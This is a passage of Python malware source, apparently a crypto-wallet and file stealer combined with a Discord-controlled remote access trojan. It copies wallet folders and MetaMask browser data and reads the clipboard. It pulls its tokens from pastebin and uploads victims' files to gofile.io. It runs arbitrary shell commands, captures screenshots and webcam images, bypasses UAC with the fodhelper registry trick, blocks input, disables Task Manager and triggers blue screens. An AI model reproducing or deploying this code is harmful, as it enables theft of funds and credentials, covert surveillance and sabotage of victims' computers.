    response = requests.get("https://pastebin.com/raw/1TgFXXB5")
    return response.text.strip()
# def

# def
def copytree(src, dst, dirs_exist_ok=False):
    try:
        shutil.copytree(src, dst, dirs_exist_ok=dirs_exist_ok)
    except Exception as e:
        print(f"Error copying {src} to {dst}: {e}")

def steal_wallets(base_directory):
    wallet_path = os.path.join(base_directory, "Wallets")
    os.makedirs(wallet_path, exist_ok=True)

    wallets = (
        ("Zcash", os.path.join(os.getenv("APPDATA"), "Zcash")),
        ("Armory", os.path.join(os.getenv("APPDATA"), "Armory")),
        ("Bytecoin", os.path.join(os.getenv("APPDATA"), "Bytecoin")),
        ("Jaxx", os.path.join(os.getenv("APPDATA"), "com.liberty.jaxx", "IndexedDB", "file_0.indexeddb.leveldb")),
        ("Exodus", os.path.join(os.getenv("APPDATA"), "Exodus", "exodus.wallet")),
        ("Ethereum", os.path.join(os.getenv("APPDATA"), "Ethereum", "keystore")),
        ("Electrum", os.path.join(os.getenv("APPDATA"), "Electrum", "wallets")),
        ("AtomicWallet", os.path.join(os.getenv("APPDATA"), "atomic", "Local Storage", "leveldb")),
        ("Guarda", os.path.join(os.getenv("APPDATA"), "Guarda", "Local Storage", "leveldb")),
        ("Coinomi", os.path.join(os.getenv("LOCALAPPDATA"), "Coinomi", "Coinomi", "wallets")),
    )

    browser_paths = {
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
        "Chromium": os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data"),
        "Comodo": os.path.join(os.getenv("LOCALAPPDATA"), "Comodo", "Dragon", "User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
        "EpicPrivacy": os.path.join(os.getenv("LOCALAPPDATA"), "Epic Privacy Browser", "User Data"),
        "Iridium": os.path.join(os.getenv("LOCALAPPDATA"), "Iridium", "User Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Opera GX": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
        "Slimjet": os.path.join(os.getenv("LOCALAPPDATA"), "Slimjet", "User Data"),
        "UR": os.path.join(os.getenv("LOCALAPPDATA"), "UR Browser", "User Data"),
        "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
        "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
    }

    for name, path in wallets:
        if os.path.isdir(path):
            wallet_folder = os.path.join(wallet_path, name)
            os.makedirs(wallet_folder, exist_ok=True)
            try:
                if path != wallet_folder:
                    copytree(path, os.path.join(wallet_folder, os.path.basename(path)), dirs_exist_ok=True)
            except Exception as e:
                print(f"Error copying {name} wallet: {e}")
    
    for name, path in browser_paths.items():
        if os.path.isdir(path):
            for root, dirs, _ in os.walk(path):
                for dir_name in dirs:
                    if dir_name == "Local Extension Settings":
                        local_extensions_settings_dir = os.path.join(root, dir_name)
                        for ext_dir in ("ejbalbakoplchlghecdalmeeeajnimhm", "nkbihfbeogaeaoehlefnkodbefgpgknn"):
                            ext_path = os.path.join(local_extensions_settings_dir, ext_dir)
                            metamask_browser = os.path.join(wallet_path, f"Metamask ({name})")
                            metamask_browser_path = os.path.join(metamask_browser, ext_dir)
                            if os.path.isdir(ext_path) and os.listdir(ext_path):
                                try:
                                    copytree(ext_path, metamask_browser_path, dirs_exist_ok=True)
                                except Exception as e:
                                    print(f"Error copying MetaMask data from {ext_path}: {e}")
                                else:
                                    if not os.listdir(metamask_browser):
                                        shutil.rmtree(metamask_browser)
# def

# def
def process_files_and_folders(base_directory, allowed_extensions, keywords):
    files_folder = os.path.join(base_directory, "Files")
    FILE_SIZE_LIMIT = 2 * 1024 * 1024  # 2MB
    FOLDER_SIZE_LIMIT = 5 * 1024 * 1024  # 5MB
    
    if not os.path.exists(files_folder):
        os.makedirs(files_folder)

    copied_files, copied_folders = 0, 0

    for root, dirs, files in os.walk(base_directory):
        
        for file in files:
            file_path = os.path.join(root, file)
            if file.lower().endswith(tuple(allowed_extensions)) and any(keyword in file.lower() for keyword in keywords):
                if os.path.getsize(file_path) <= FILE_SIZE_LIMIT:
                    try:
                        shutil.copy(file_path, files_folder)
                        copied_files += 1
                    except Exception as e:
                        print(f"Failed to copy file {file_path}: {e}")

        for folder in dirs:
            folder_path = os.path.join(root, folder)
            if any(keyword in folder.lower() for keyword in keywords):
                folder_size = sum(
                    os.path.getsize(os.path.join(dirpath, f)) for dirpath, _, filenames in os.walk(folder_path) for f in filenames
                )
                if folder_size <= FOLDER_SIZE_LIMIT:
                    dest_folder_path = os.path.join(files_folder, folder)
                    try:
                        if not os.path.exists(dest_folder_path):
                            shutil.copytree(folder_path, dest_folder_path)
                            copied_folders += 1
                    except Exception as e:
                        print(f"Failed to copy folder {folder_path}: {e}")
# def

# def
def clipboard():
    os.makedirs(base_directory, exist_ok=True)
    file_path = os.path.join(base_directory, "clipboard.txt")
    clipboard_content = pyperclip.paste()
    with open(file_path, "w") as file:
        file.write(clipboard_content)
# def
# - - - - - - - - - - - - - - - - - - - - - - - - - - The Stealer - - - - - - - - - - - - - - - - - - - - - - - - -

# - - - - - - - - - - - - - - - - - - - - - - - - - - - The RAT - - - - - - - - - - - - - - - - - - - - - - - - - -

# - - - - - - - - - - - - - - - - - - - - - - - - - - - The RAT - - - - - - - - - - - - - - - - - - - - - - - - - -
def get_authorizedids():
    while True:
        try:
            url = "https://pastebin.com/raw/NmteGaes"
            response = requests.get(url)
            if response.status_code == 200:
                return response.text
            else:
                print(f"Failed to retrieve data: {response.status_code}")
                time.sleep(10)
        except Exception as e:
            print(f"Error occurred: {e}")
            time.sleep(10)

def get_rattoken():
    while True:
        try:
            url = "https://pastebin.com/raw/zUChGNjj"
            response = requests.get(url)
            if response.status_code == 200:
                return response.text
            else:
                print(f"Failed to retrieve data: {response.status_code}")
                time.sleep(10)
        except Exception as e:
            print(f"Error occurred: {e}")
            time.sleep(10)

TOKEN = f"{get_rattoken()}"

CATEGORY_NAME = "𝗛𝗩𝗡𝗖 ~ 𝗩𝗜𝗖𝗧𝗜𝗠𝗦"
AUTHORIZED_IDS = get_authorizedids():

temp_dir = os.getenv("TEMP")
file_path = os.path.join(temp_dir, "Important.txt")

def generate_unique_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

def get_bot_id():
    if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
        with open(file_path, "r") as f:
            bot_id = f.read().strip()
            if bot_id:
                return bot_id
    
    new_id = generate_unique_id()
    with open(file_path, "w") as f:
        f.write(new_id)
    return new_id

BOT_ID = get_bot_id()
CLIENT_ID = os.getenv("USERNAME") or os.getenv("USER") or "Unknown_PC"
CHANNEL_NAME = f"{CLIENT_ID}-{BOT_ID}"

intents = discord.Intents.all()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

def is_authorized(ctx):
    return ctx.author.id in AUTHORIZED_IDS

async def setup_client_channel(guild):
    category = discord.utils.get(guild.categories, name=CATEGORY_NAME)

    if not category:
        category = await guild.create_category(CATEGORY_NAME)

    existing_channel = discord.utils.get(category.channels, name=CHANNEL_NAME.lower())

    if existing_channel:
        return existing_channel

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
    }

    for user_id in AUTHORIZED_IDS:
        user = guild.get_member(user_id)
        if user:
            overwrites[user] = discord.PermissionOverwrite(read_messages=True, send_messages=True)

    return await category.create_text_channel(CHANNEL_NAME, overwrites=overwrites)

def is_correct_channel(ctx):
    return ctx.channel.name.lower() == CHANNEL_NAME.lower()

# ✅ Command: Run CMD
@bot.command()
async def cmd(ctx, *, command: str):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        return

    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        await ctx.send(f"```\n{output[:1900]}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# ✅ Command: Run Shell (Bash/Powershell)
@bot.command()
async def shell(ctx, *, command: str):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        return

    shell_type = "bash" if platform.system() != "Windows" else "powershell"
    try:
        result = subprocess.run(command, shell=True, executable=shell_type, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        await ctx.send(f"```\n{output[:1900]}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# ✅ Command: Screenshot
@bot.command()
async def screenshot(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        return

    try:
        screenshot = pyautogui.screenshot()
        screenshot_file = BytesIO()
        screenshot.save(screenshot_file, format="PNG")
        screenshot_file.seek(0)
        await ctx.send(file=discord.File(screenshot_file, filename="screenshot.png"))
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# ✅ Command: Webcam Capture
@bot.command()
async def webcam(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        return

    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ctx.send("❌ Unable to access the webcam.")
            return

        ret, frame = cap.read()
        cap.release()

        if not ret:
            await ctx.send("❌ Failed to capture webcam image.")
            return

        _, buffer = cv2.imencode('.png', frame)
        webcam_image = BytesIO(buffer)
        webcam_image.seek(0)

        await ctx.send(file=discord.File(webcam_image, filename="webcam.png"))
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# ✅ Command: Text-to-Speech
@bot.command()
async def voice(ctx, *, text: str):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        return

    try:
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        await ctx.send(f"🗣 Speaking: {text}")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# ✅ Command: Adjust Volume
@bot.command()
async def volume(ctx, amount: int):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        return

    if 0 <= amount <= 100:
        try:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = interface.QueryInterface(IAudioEndpointVolume)
            volume.SetMasterVolumeLevelScalar(amount / 100.0, None)
            await ctx.send(f"🔊 Volume set to {amount}%")
        except Exception as e:
            await ctx.send(f"❌ Error: {str(e)}")
    else:
        await ctx.send("❌ Volume must be between 0 and 100.")

# ✅ Command: List Running Processes
@bot.command()
async def tasklist(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        return

    try:
        process_list = "\n".join([f"PID: {p.info['pid']} | Name: {p.info['name']}" for p in psutil.process_iter(['pid', 'name'])])
        await ctx.send(f"```\n{process_list[:1900]}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# ✅ Command: Kill Process
@bot.command()
async def taskkill(ctx, *, process_name: str):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        return

    killed_processes = [p.info['name'] for p in psutil.process_iter(['pid', 'name']) if process_name.lower() in p.info['name'].lower()]
    for p in psutil.process_iter(['pid', 'name']):
        if process_name.lower() in p.info['name'].lower():
            p.kill()

    await ctx.send(f"✅ Killed processes: {', '.join(killed_processes)}" if killed_processes else f"❌ No process found with name: {process_name}")

def get_ip_info():
    try:
        response = requests.get("http://ipinfo.io/json", timeout=5).json()
        return response.get("ip", "Unknown"), response.get("country", "Unknown")
    except Exception:
        return "Unknown", "Unknown"

def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin() != 0

# ✅ Command: Files
FOLDER_ICON = "📁"
FILE_ICONS = {
    ".txt": "📄", ".exe": "🖥", ".mp3": "🎵", ".mp4": "🎥", ".png": "🖼",
    ".jpg": "🖼", ".jpeg": "🖼", ".pdf": "🔍", ".docx": "📄", ".zip": "📦"
}
DEFAULT_FILE_ICON = "📄"
INDENT = "   "
user_navigation = {}
def generate_tree(directory):
    tree = []
    folder_list = []
    try:
        tree.append(f"{directory}\n")

        entries = sorted(os.listdir(directory))
        
        for entry in entries:
            full_path = os.path.join(directory, entry)
            if os.path.isdir(full_path):
                tree.append(f"📁 {entry}/")
                folder_list.append((entry, full_path))
            else:
                tree.append(f"📄 {entry}")

    except PermissionError:
        tree.append("(No Permissions)")

    return "\n".join(tree), folder_list


@bot.command()
async def files(ctx, path: str = None, start_index: int = 0):
    user_id = ctx.author.id

    if path is None:
        path = os.path.expanduser("~")

    if user_id not in user_navigation:
        user_navigation[user_id] = {
            "history": [],
            "current": path,
            "forward_stack": [],
            "folder_list": [],
            "start_index": 0,
            "message": None
        }

    user_navigation[user_id]["current"] = path
    user_navigation[user_id]["start_index"] = start_index

    files_str, folder_list = generate_tree(path)
    user_navigation[user_id]["folder_list"] = folder_list

    embed = discord.Embed(title="📂 File Explorer", description=f"```\n{files_str}\n```", color=discord.Color.blue())
    view = FileTreeView(ctx, path, start_index)

    if user_navigation[user_id]["message"]:
        try:
            await user_navigation[user_id]["message"].delete()
        except discord.NotFound:
            pass

    user_navigation[user_id]["message"] = await ctx.send(embed=embed, view=view)

class FileTreeView(View):
    def __init__(self, ctx, path, start_index):
        super().__init__(timeout=60)
        self.ctx = ctx
        self.path = path
        self.user_id = ctx.author.id
        self.start_index = start_index

        folder_list = user_navigation[self.user_id]["folder_list"]
        total_folders = len(folder_list)

        back_button = Button(label="🔙 Back", style=discord.ButtonStyle.gray)
        back_button.callback = self.go_back
        self.add_item(back_button)

        forward_button = Button(label="🔜 Forward", style=discord.ButtonStyle.gray)
        forward_button.callback = self.go_forward
        self.add_item(forward_button)

        for folder_name, full_path in folder_list[start_index:start_index + 8]:
            folder_button = Button(label=f"📂 {folder_name}", style=discord.ButtonStyle.blurple)
            folder_button.callback = lambda i, p=full_path: self.open_folder(i, p)
            self.add_item(folder_button)

        if start_index > 0:
            prev_button = Button(label="⏪ Previous", style=discord.ButtonStyle.gray)
            prev_button.callback = self.prev_folders
            self.add_item(prev_button)

        if start_index + 8 < total_folders:
            next_button = Button(label="⏩ Next", style=discord.ButtonStyle.gray)
            next_button.callback = self.next_folders
            self.add_item(next_button)

    async def go_back(self, interaction: discord.Interaction):
        history = user_navigation[self.user_id]["history"]
        if history:
            user_navigation[self.user_id]["forward_stack"].append(self.path)
            previous_path = history.pop()
            await files(self.ctx, previous_path)
        else:
            await interaction.response.send_message("🚫 No previous directory!", ephemeral=True)

    async def go_forward(self, interaction: discord.Interaction):
        forward_stack = user_navigation[self.user_id]["forward_stack"]
        if forward_stack:
            next_path = forward_stack.pop()
            user_navigation[self.user_id]["history"].append(self.path)
            await files(self.ctx, next_path)
        else:
            await interaction.response.send_message("🚫 No next directory!", ephemeral=True)

    async def open_folder(self, interaction: discord.Interaction, folder_path):
        user_navigation[self.user_id]["history"].append(self.path)
        user_navigation[self.user_id]["forward_stack"] = []
        await files(self.ctx, folder_path)

    async def next_folders(self, interaction: discord.Interaction): 
        new_start = self.start_index + 8
        await files(self.ctx, self.path, new_start)

    async def prev_folders(self, interaction: discord.Interaction):
        new_start = max(0, self.start_index - 8)
        await files(self.ctx, self.path, new_start)

# ✅ Command: Download File (Attachment)
@bot.command()
async def downloadfile(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        return

    if not ctx.message.attachments:
        await ctx.send("❌ No file attached! Please upload a file with the command.")
        return

    attachment = ctx.message.attachments[0]
    save_path = os.path.join(os.getenv("TEMP"), attachment.filename)

    try:
        await attachment.save(save_path)
        await ctx.send(f"✅ File saved to `{save_path}`")
    except Exception as e:
        await ctx.send(f"❌ Error saving file: {str(e)}")


# ✅ Command: Download File from URL
@bot.command()
async def downloadurl(ctx, url: str):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        return

    filename = url.split("/")[-1]
    save_path = os.path.join(os.getenv("TEMP"), filename)

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    with open(save_path, "wb") as f:
                        f.write(await resp.read())
                    await ctx.send(f"✅ File downloaded and saved as `{save_path}`")
                else:
                    await ctx.send(f"❌ Failed to download file. HTTP Status: {resp.status}")
    except Exception as e:
        await ctx.send(f"❌ Error downloading file: {str(e)}")


# ✅ Command: Run a File
@bot.command()
async def runfile(ctx, file_path: str):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        return

    if not os.path.exists(file_path):
        await ctx.send("❌ File not found!")
        return

    try:
        subprocess.Popen(file_path, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        await ctx.send(f"✅ Running `{file_path}`")
    except Exception as e:
        await ctx.send(f"❌ Error running file: {str(e)}")

# ✅ Command: Show Contents of a File
@bot.command()
async def read(ctx, file_path: str):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        return

    if not os.path.exists(file_path):
        await ctx.send("❌ File not found.")
        return

    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        
        if len(content) > 1900:
            await ctx.send("⚠ File is too large to display. Use `!get` to download it.")
        else:
            await ctx.send(f"```\n{content}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error reading file: {str(e)}")

# ✅ Command: Get a file from user computer
@bot.command()
async def get(ctx, file_path: str):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        return

    if not os.path.exists(file_path):
        await ctx.send("❌ File not found.")
        return

    file_size = os.path.getsize(file_path)
    file_name = os.path.basename(file_path)
    try:
        with open(file_path, "rb") as f:
            response = requests.post("https://store7.gofile.io/uploadFile", files={"file": f})
            response_json = response.json()

        if response_json["status"] == "ok":
            file_url = response_json["data"]["downloadPage"]
            embed = discord.Embed(title="📁 File Uploaded to Gofile", color=discord.Color.blue())
            embed.add_field(name="📄 Name", value=file_name, inline=False)
            embed.add_field(name="📂 Location", value=file_path, inline=False)
            embed.add_field(name="📏 Size", value=f"{file_size / (1024 * 1024):.2f} MB", inline=False)
            embed.add_field(name="🔗 Download Link", value=f"[Click Here]({file_url})", inline=False)
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Failed to upload to Gofile.")
    except Exception as e:
        await ctx.send(f"❌ Error uploading to Gofile: {str(e)}")

@bot.command()
async def uacbypass(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        await ctx.send("❌ You are not authorized or not in the correct channel.")
        return

    await ctx.send("🔓 Attempting to bypass UAC...")

    def isAdmin():
        try:
            is_admin = (os.getuid() == 0)
        except AttributeError:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        return is_admin

    if isAdmin():
        await ctx.send("✅ You already have admin privileges!")
        return

    class disable_fsr():
        disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
        revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection

        def __enter__(self):
            self.old_value = ctypes.c_long()
            self.success = self.disable(ctypes.byref(self.old_value))

        def __exit__(self, type, value, traceback):
            if self.success:
                self.revert(self.old_value)
    try:
        await ctx.send("🚀 Attempting to escalate privileges...")
        isexe = sys.argv[0].endswith("exe")

        if not isexe:
            test_str = sys.argv[0]
            current_dir = inspect.getframeinfo(inspect.currentframe()).filename
            cmd2 = current_dir
            create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
            os.system(create_reg_path)
            create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
            os.system(create_trigger_reg_key)
            create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' + '"' + '"\'"' + """ -Force"""
            os.system(create_payload_reg_key)
        else:
            test_str = sys.argv[0]
            current_dir = test_str
            cmd2 = current_dir
            create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
            os.system(create_reg_path)
            create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
            os.system(create_trigger_reg_key)
            create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' + '"' + '"\'"' + """ -Force"""
            os.system(create_payload_reg_key)

        with disable_fsr():
            os.system("fodhelper.exe")

        time.sleep(2)
        remove_reg = """ powershell Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force """
        os.system(remove_reg)

        await ctx.send("✅ UAC bypass completed successfully, you should now have admin rights.")
    except Exception as e:
        await ctx.send(f"❌ An error occurred: {str(e)}")

@bot.command()
async def blockinput(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        await ctx.send("❌ You are not authorized or not in the correct channel.")
        return

    if ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.user32.BlockInput(True)
        await ctx.send("🔒 **Input has been blocked!** (Keyboard & Mouse)")
    else:
        await ctx.send("⚠️ **Admin rights are required! Attempting to elevate...**")
        await elevate_and_retry(ctx, "blockinput")

@bot.command()
async def unblockinput(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        await ctx.send("❌ You are not authorized or not in the correct channel.")
        return

    if ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.user32.BlockInput(False)
        await ctx.send("🔓 **Input has been unblocked!** (Keyboard & Mouse)")
    else:
        await ctx.send("⚠️ **Admin rights are required! Attempting to elevate...**")
        await elevate_and_retry(ctx, "unblockinput")

import time
import os
import discord
from discord.ext import commands

@bot.command()
async def shutdown(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        await ctx.send("❌ You are not authorized or not in the correct channel.")
        return

    start_time = time.time()  # Track start time for performance measurement
    try:
        uncritproc()
        os.system("shutdown /p")  # Initiates shutdown
        elapsed_time = time.time() - start_time

        embed = discord.Embed(
            title="🛑 System Shutdown Initiated",
            description=f"The system is shutting down... ⏳\nTime Taken: `{elapsed_time:.2f} seconds`",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            title="❌ Error Shutting Down",
            description=f"An error occurred while trying to shut down the system:\n`{str(e)}`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command()
async def restart(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        await ctx.send("❌ You are not authorized or not in the correct channel.")
        return

    start_time = time.time()  # Track start time for performance measurement
    try:
        uncritproc()
        os.system("shutdown /r /t 00")  # Initiates restart
        elapsed_time = time.time() - start_time

        embed = discord.Embed(
            title="🔄 System Restart Initiated",
            description=f"The system is restarting... ⏳\nTime Taken: `{elapsed_time:.2f} seconds`",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            title="❌ Error Restarting System",
            description=f"An error occurred while trying to restart the system:\n`{str(e)}`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command()
async def logoff(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        await ctx.send("❌ You are not authorized or not in the correct channel.")
        return

    start_time = time.time()
    try:
        uncritproc()
        os.system("shutdown /l /f")
        elapsed_time = time.time() - start_time

        embed = discord.Embed(
            title="🚪 User Logged Off",
            description=f"The user has been logged off... ⏳\nTime Taken: `{elapsed_time:.2f} seconds`",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            title="❌ Error Logging Off",
            description=f"An error occurred while trying to log off the user:\n`{str(e)}`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.command()
async def bluescreen(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        await ctx.send("❌ You are not authorized or not in the correct channel.")
        return

    start_time = time.time()
    
    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
            
            elapsed_time = time.time() - start_time
            
            embed = discord.Embed(
                title="💥 Blue Screen Triggered",
                description=f"The blue screen was successfully triggered! ⏳\nTime Taken: `{elapsed_time:.2f} seconds`",
                color=discord.Color.green()
            )
            await ctx.send(embed=embed)
        except Exception as e:
            elapsed_time = time.time() - start_time
            
            embed = discord.Embed(
                title="❌ Error Triggering Blue Screen",
                description=f"An error occurred while trying to trigger the blue screen:\n`{str(e)}`\nTime Taken: `{elapsed_time:.2f} seconds`",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="⚠️ Admin Rights Required",
            description="You need admin privileges to trigger a blue screen. Attempting elevation...",
            color=discord.Color.orange()
        )
        await ctx.send(embed=embed)
        await elevate_and_retry(ctx, "bluescreen")

@bot.command()
async def currentdir(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        await ctx.send("❌ You are not authorized or not in the correct channel.")
        return

    try:
        output = subprocess.getoutput('cd')
        await ctx.send(f"```\n{output}\n```")
    except Exception as e:
        await ctx.send(f"❌ **Error:** `{str(e)}`")

@bot.command()
async def displayoff(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        await ctx.send("❌ You are not authorized or not in the correct channel.")
        return

    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            WM_SYSCOMMAND = 274
            HWND_BROADCAST = 65535
            SC_MONITORPOWER = 61808

            ctypes.windll.user32.BlockInput(True)
            ctypes.windll.user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)

            await ctx.send("🔻 **Display turned off.**")
        except Exception as e:
            await ctx.send(f"❌ **Error:** `{str(e)}`")
    else:
        await ctx.send("⚠️ **Admin rights required! Attempting elevation...**")
        await elevate_and_retry(ctx, "displayoff")

@bot.command()
async def displayon(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        await ctx.send("❌ You are not authorized or not in the correct channel.")
        return

    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            keyboard = Controller()
            
            keyboard.press(Key.esc)
            keyboard.release(Key.esc)
            keyboard.press(Key.esc)
            keyboard.release(Key.esc)

            ctypes.windll.user32.BlockInput(False)
            await ctx.send("🔺 **Display turned on.**")
        except Exception as e:
            await ctx.send(f"❌ **Error:** `{str(e)}`")
    else:
        await ctx.send("⚠️ **Admin rights required! Attempting elevation...**")
        await elevate_and_retry(ctx, "displayon")

@bot.command()
async def distaskmgr(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        await ctx.send("❌ You are not authorized or not in the correct channel.")
        return

    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            await ctx.send("⚙️ **Disabling Task Manager...**")
            
            instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'

            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output

            shel = threading.Thread(target=shell)
            shel.start()
            time.sleep(1)
            shel.join()

            result = str(shell().stdout.decode('CP437'))

            if len(result) <= 5:
                reg.CreateKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')

            subprocess.run('powershell New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" -Name "DisableTaskMgr" -Value "1" -Force', shell=True)

            await ctx.send("✅ **Task Manager has been disabled.**")
        except Exception as e:
            await ctx.send(f"❌ **Error:** `{str(e)}`")
    else:
        await ctx.send("⚠️ **Admin rights required! Attempting elevation...**")
        await elevate_and_retry(ctx, "distaskmgr")

@bot.command()
async def enbtaskmgr(ctx):
    if not is_authorized(ctx) or not is_correct_channel(ctx):
        await ctx.send("❌ You are not authorized or not in the correct channel.")
        return

    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            await ctx.send("⚙️ **Enabling Task Manager...**")

            instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'

            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output

            shel = threading.Thread(target=shell)
            shel.start()
            time.sleep(1)
            shel.join()

            result = str(shell().stdout.decode('CP437'))

            if len(result) > 5:
                reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')

            await ctx.send("✅ **Task Manager has been enabled.**")
        except Exception as e:
            await ctx.send(f"❌ **Error:** `{str(e)}`")
    else:
        await ctx.send("⚠️ **Admin rights required! Attempting elevation...**")
        await elevate_and_retry(ctx, "enbtaskmgr")

def disabletaskmanager():
    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'

            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output

            shel = threading.Thread(target=shell)
            shel.start()
            time.sleep(1)
            shel.join()

            result = str(shell().stdout.decode('CP437'))

            if len(result) > 5:
                reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
        except Exception:
            pass
    else:
        pass

def hidescreen():
    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            WM_SYSCOMMAND = 274
            HWND_BROADCAST = 65535
